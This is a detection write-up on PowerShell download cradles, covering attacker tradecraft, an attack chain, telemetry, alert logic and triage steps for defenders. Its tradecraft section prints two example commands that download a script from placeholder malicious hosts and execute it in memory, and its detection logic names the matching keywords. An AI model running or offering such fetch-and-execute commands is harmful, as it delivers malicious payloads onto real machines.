# Detection: PowerShell Download Cradle Execution

MITRE ATT&CK Technique: T1059.001
Tactic: Execution

---

# Overview

PowerShell download cradles are commonly used by attackers to download and execute malicious payloads directly from the internet.

Instead of writing files to disk, attackers often load malicious scripts directly into memory.

This technique helps bypass traditional antivirus detection.

---

# Adversary Tradecraft

A typical PowerShell download cradle looks like:

```
IEX (New-Object Net.WebClient).DownloadString('http://malicious-site/payload.ps1')
```

or

```
powershell -c "IEX (iwr http://malicious/payload.ps1)"
```

The command downloads a remote script and executes it immediately.

---

# Real World Attack Scenario

```
phishing document
        ↓
macro execution
        ↓
PowerShell download cradle
        ↓
payload execution
        ↓
command and control beaconing
```

This technique is widely used in ransomware and post-exploitation frameworks.

---

# Endpoint Telemetry

Relevant telemetry signals include:

• PowerShell command line arguments
• network connections initiated by PowerShell
• script block logging events

PowerShell Script Block Logging may record the downloaded script content.

---

# Detection Logic

Alert when:

• PowerShell executes commands containing `DownloadString`
• PowerShell downloads remote content via `WebClient`
• PowerShell executes `Invoke-WebRequest` or `IEX`

---

# Investigation Workflow

1 Review PowerShell command line
2 Identify remote URL used in download
3 Inspect downloaded script contents
4 Investigate additional processes spawned by PowerShell

---

# Potential False Positives

Administrators sometimes use PowerShell to download scripts.

Verify:

• source URL reputation
• script content
• execution context
